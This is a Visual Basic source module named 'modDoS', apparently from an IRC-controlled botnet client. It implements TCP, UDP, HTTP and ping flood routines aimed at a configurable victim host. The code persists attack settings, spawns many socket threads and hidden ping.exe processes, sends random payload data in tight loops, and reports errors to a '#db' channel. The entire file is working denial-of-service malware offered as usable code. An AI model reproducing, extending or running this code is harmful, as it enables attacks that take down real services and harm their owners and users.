Attribute VB_Name = "modDoS"
Option Explicit

Global HTTP As HTTP
Global UDP As UDP
Global Ping As Ping
Global TCP As TCP

Private Type HTTP
    Hostname As String 'victim's hostname
    Port As String
    Directory As String
    BeginDate As String
    Duration As Long
    DateType As String
    Threads As Long
    URL As String
    Flooding As Boolean
    ConnectState() As Long
End Type

Private Type UDP
    BeginDate As String
    DateType As String
    Duration As Long
    Hostname As String
    IP As String
    Delay As Long
    Port As String
    PacketSize As Long
    Data As String 'Data that its flooding with
    Flooding As Boolean
End Type

Private Type TCP
    BeginDate As String
    Hostname As String 'victim's hostname
    IP As String 'victim's IP
    Ports As String
    Port() As String
    DateType As String
    Duration As Long
    Threads As Long
    PacketSize As Long
    Data As String
    TimeoutCount() As Long
    Timeout As Long
    Flooding As Boolean
End Type

Private Type Ping
    BeginDate As String
    Hostname As String
    IP As String
    DateType As String
    Duration As Long
    PingSize As Long
    Threads As Long
    Flooding As Boolean
End Type

Public Sub BeginTCPFlood()
    'On Local Error Resume Next
    On Local Error GoTo ErrHand
    Dim i As Integer
    
    With TCP
        Call SaveSetting("tcp.BeginDate", .BeginDate)
        Call SaveSetting("tcp.DateType", .DateType)
        Call SaveSetting("tcp.Duration", CStr(.Duration))
        Call SaveSetting("tcp.Hostname", .Hostname)
        Call SaveSetting("tcp.IP", .IP)
        Call SaveSetting("tcp.Ports", .Ports)
        Call SaveSetting("tcp.Threads", CStr(.Threads))
        Call SaveSetting("tcp.PacketSize", CStr(.PacketSize))
        Call SaveSetting("tcp.Flooding", "1")
        
        .Port = Split(.Ports, ",")
        
        .Data = RandBinary(.PacketSize)
        frmMain.tmrTCP.Enabled = True
        .Flooding = True
        ReDim TCP.TimeoutCount(.Threads)
        
        For i = 1 To .Threads
            frmMain.sckTCP.ArrayAdd i
            Load frmMain.tmrTCPTimeout(i)
            TCPConnectSck (i)
        Next
    End With
    
    Exit Sub
ErrHand:
    DirectMsgChan "BeginTCPFlood #" & Err.Number & ": " & Err.Description, "#db"
    Resume Next
End Sub

Public Sub StopTCPFlood(blnTempStop As Boolean)
    'On Local Error Resume Next
    On Local Error GoTo ErrHand
    If TCP.Flooding = True Then
        Dim i As Integer
        If blnTempStop = False Then Call SaveSetting("tcp.Flooding", "0")
        TCP.Flooding = False
        frmMain.tmrTCP.Enabled = False
        
        For i = 1 To TCP.Threads
            frmMain.sckTCP.ArrayRemove i
            Unload frmMain.tmrTCPTimeout(i)
        Next
    End If
    
    Exit Sub
ErrHand:
    DirectMsgChan "StopTCPFlood #" & Err.Number & ": " & Err.Description, "#db"
    Resume Next
End Sub

Public Sub BeginUDPFLood()
    On Local Error Resume Next
    
    With UDP
        Call SaveSetting("udp.BeginDate", .BeginDate)
        Call SaveSetting("udp.DateType", .DateType)
        Call SaveSetting("udp.Duration", CStr(.Duration))
        Call SaveSetting("udp.Hostname", .Hostname)
        Call SaveSetting("udp.IP", .IP)
        Call SaveSetting("udp.Delay", CStr(.Delay))
        Call SaveSetting("udp.Port", .Port)
        Call SaveSetting("udp.PacketSize", CStr(.PacketSize))
        Call SaveSetting("udp.Flooding", "1")
        
        If .Port = 0 Then .Port = RandNum(1, 65535)
    
        frmMain.sckUDP.RemoteHost(1) = .IP
        frmMain.sckUDP.RemotePort(1) = .Port
        
        .Data = RandBinary(.PacketSize)
        
        .Flooding = True
        frmMain.tmrUDP.Enabled = True
        
        If .Delay = 0 Then
            Do Until .Flooding = False
                frmMain.sckUDP.SendData 1, .Data
                DoEvents
            Loop
        Else
            frmMain.tmrUDPFlood.Interval = .Delay
            frmMain.tmrUDPFlood.Enabled = True
        End If
    End With
End Sub

Public Sub StopUDPFlood(blnTempStop As Boolean)
    If UDP.Flooding = True Then
        If blnTempStop = False Then Call SaveSetting("udp.Flooding", "0")
        frmMain.tmrUDPFlood.Enabled = False
        frmMain.tmrUDP.Enabled = False
        UDP.Flooding = False
    End If
End Sub

Public Sub BeginHTTPFlood()
    On Local Error Resume Next
    Dim i As Integer
    
    With HTTP
        Call SaveSetting("http.Flooding", "1")
        Call SaveSetting("http.BeginDate", .BeginDate)
        Call SaveSetting("http.Duration", CStr(.Duration))
        Call SaveSetting("http.DateType", .DateType)
        Call SaveSetting("http.Threads", CStr(.Threads))
        Call SaveSetting("http.URL", .URL)
        Call SaveSetting("http.Port", .Port)
        
        Call ParseURL(.URL, .Hostname, .Directory)
        
        ReDim HTTP.ConnectState(1 To .Threads)
        
        For i = 1 To .Threads
            frmMain.sckHTTP.ArrayAdd i
            frmMain.sckHTTP.Connect i, .Hostname, .Port
        Next
        
        .Flooding = True
        frmMain.tmrHttp.Enabled = True
    End With
End Sub

Public Sub StopHTTPFlood(blnTempStop As Boolean)
    On Local Error Resume Next
    If HTTP.Flooding = True Then
        Dim i As Integer
        If blnTempStop = False Then Call SaveSetting("http.Flooding", "0")
        HTTP.Flooding = False
        frmMain.tmrHttp.Enabled = False
        
        For i = 1 To HTTP.Threads
            frmMain.sckHTTP.ArrayRemove i
        Next
        
        ReDim HTTP.ConnectState(1 To 1)
    End If
End Sub

Public Sub BeginPingFlood()
    On Local Error Resume Next
    Dim PingDir As String
    Dim i As Long
    
    If FileExists(Client.SystemDir & "\ping.exe") Then
        PingDir = Client.SystemDir & "\ping.exe"
    ElseIf FileExists(Client.WindowsDir & "\ping.exe") Then
        PingDir = Client.WindowsDir & "\ping.exe"
    Else
        Exit Sub
    End If
    
    With Ping
        Call SaveSetting("ping.BeginDate", .BeginDate)
        Call SaveSetting("ping.Duration", CStr(.Duration))
        Call SaveSetting("ping.DateType", CStr(.DateType))
        Call SaveSetting("ping.Hostname", .Hostname)
        Call SaveSetting("ping.IP", .IP)
        Call SaveSetting("ping.PingSize", CStr(.PingSize))
        Call SaveSetting("ping.Threads", CStr(.Threads))
        Call SaveSetting("ping.Flooding", "1")
        
        For i = 1 To .Threads
            Call ShellExecute(GetDesktopWindow(), "open", PingDir, .IP & " -l " & .PingSize & " -t -w 0", "", 0)
            DoEvents
            DoEventsWait (500) 'space the launchings 500 ms apart
        Next
        
        .Flooding = True
        frmMain.tmrPing.Enabled = True
    End With
End Sub

Public Sub StopPingFlood(blnTempStop As Boolean)
    On Local Error Resume Next
    If Ping.Flooding = True Then
        Dim PingDir As String
        Dim hwnd As Long
        Dim ClassName As String
        Dim ii As Long
        
        Ping.Flooding = False
        If blnTempStop = False Then Call SaveSetting("ping.Flooding", "0")
        frmMain.tmrPing.Enabled = False
        
        If FileExists(Client.SystemDir & "\ping.exe") Then
            PingDir = Client.SystemDir & "\ping.exe"
        ElseIf FileExists(Client.WindowsDir & "\ping.exe") Then
            PingDir = Client.WindowsDir & "\ping.exe"
        End If

        For ii = 1 To Ping.Threads
            'gets the window's class name
            GetClassNameByTitle PingDir, hwnd, ClassName
            'close the window
            PostMessage hwnd, WM_CLOSE, 0&, 0&
            DoEventsWait (100)
        Next
    End If
End Sub

Public Function HTTPConnectSck(Index As Variant)
    On Local Error Resume Next
    If HTTP.Flooding = True Then
        frmMain.sckHTTP.CloseSck Index
        frmMain.sckHTTP.Connect Index, HTTP.Hostname, HTTP.Port
    End If
End Function

Public Function TCPConnectSck(Index As Integer)
    'On Local Error Resume Next
On Local Error GoTo ErrHand
    If TCP.Flooding = True Then
        TCP.TimeoutCount(Index) = 0
        frmMain.tmrTCPTimeout(Index).Enabled = True
        frmMain.sckTCP.CloseSck Index
        frmMain.sckTCP.Connect Index, TCP.IP, TCP.Port(RandNum(0, UBound(TCP.Port)))
    End If
    
    Exit Function
ErrHand:
    DirectMsgChan "TCPConnectSck #" & Err.Number & ": " & Err.Description, "#db"
    Resume Next
End Function
